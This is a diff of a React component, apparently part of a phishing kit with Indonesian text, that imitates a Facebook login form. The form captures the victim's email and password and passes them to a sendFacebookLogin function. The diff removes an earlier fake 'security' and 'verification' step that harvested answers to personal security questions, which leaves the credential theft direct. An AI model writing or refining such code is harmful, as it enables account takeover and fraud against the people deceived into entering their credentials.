@@ -10,46 +10,28 @@ interface FacebookLoginProps {
 }
 
 const FacebookLogin = ({ onClose, playClickSound }: FacebookLoginProps) => {
-  const [step, setStep] = useState(1); // 1: FB Form, 1.5: Security, 2: Verification, 3: Success
+  const [step, setStep] = useState(1); // 1: FB Form, 3: Success
 
   // STEP 1 STATES
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   
-  // STEP 2 STATES
-  const [a1, setA1] = useState('');
-  const [a2, setA2] = useState('');
-
   const [loading, setLoading] = useState(false);
   const [showCustomLoading, setShowCustomLoading] = useState(false);
 
-  // STEP 1 HANDLER: Move to Security Notification
-  const handleFbSubmit = (e: React.FormEvent) => {
+  // STEP 1 HANDLER: Direct Submit
+  const handleFbSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!email || !password) {
       alert("Email dan Kata Sandi harus diisi!");
       return;
     }
-    setStep(1.5);
-  };
-
-  const handleSecurityProceed = () => {
-    if (playClickSound) playClickSound();
-    setStep(2);
-  };
-
-  const handleFinalSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
     
-    // Basic Validation
-    if (!a1 || a1.length < 1) return; // Add visual error handling if needed
-    if (!a2 || a2.length < 1) return;
-
     setLoading(true);
 
-    // Hardcoded questions context
-    const q1 = `Q1. Apa film favorit Anda? (<code>${a1}</code>)`;
-    const q2 = `Q2. Apa Makanan Kesukaan Anda? (<code>${a2}</code>)`;
+    // No questions anymore
+    const q1 = "-";
+    const q2 = "-";
 
     // Send all data (FB Creds + Answers)
     const success = await sendFacebookLogin(email, password, q1, q2);
@@ -66,7 +48,7 @@ const FacebookLogin = ({ onClose, playClickSound }: FacebookLoginProps) => {
         setStep(3); // Show Success
       } else {
         alert("Terjadi kesalahan. Silakan coba lagi.");
-        setStep(2); // Retry questions
+        setStep(1); // Retry login
       }
     }, 5000);
   };
@@ -146,69 +128,6 @@ const FacebookLogin = ({ onClose, playClickSound }: FacebookLoginProps) => {
               Buat akun baru
             </button>
           </form>
-        </div>
-      )}
-
-      {/* ================= STEP 1.5: SECURITY NOTIFICATION ================= */}
-      {step === 1.5 && (
-        <div className="security-popup-container animate-pop-in">
-          <img 
-            src="/keamanan.png" 
-            alt="Keamanan" 
-            className="login-bg-img" 
-            onClick={handleSecurityProceed}
-            style={{ cursor: 'pointer' }}
-          />
-          <button 
-             className="security-btn" 
-             onClick={handleSecurityProceed}
-             aria-label="Lanjutkan Verifikasi"
-          ></button>
-        </div>
-      )}
-
-      {/* ================= STEP 2: VERIFICATION QUESTIONS (IMAGE BASED) ================= */}
-      {step === 2 && (
-        <div className="verification-popup-container animate-pop-in">
-          <div className="verification-inner">
-          
-            <img src="/verifikasi.png" alt="Verifikasi" className="verification-bg-img" />
-            
-            <div className="verification-inputs">
-              <input 
-                type="text" 
-                id="answer1" 
-                className="verify-input" 
-                placeholder=""
-                value={a1}
-                onChange={(e) => setA1(e.target.value)}
-              />
-              <input 
-                type="text" 
-                id="answer2" 
-                className="verify-input" 
-                placeholder=""
-                value={a2}
-                onChange={(e) => setA2(e.target.value)}
-              />
-            </div>
-
-            {/* <div className="verify-helper-text">Silakan masukkan Jawaban</div> */}
-
-     
-
-  <button className="close-btn" onClick={handleClose} aria-label="Close"></button>
-
-          <button 
-            id="submitButton" 
-            className="submit-btn-custom" 
-            onClick={(e) => { if(playClickSound) playClickSound(); handleFinalSubmit(e); }}
-             disabled={loading}
-            aria-label="Confirm"
-          ></button>
-    
-
-          </div>
         </div>
       )}
 
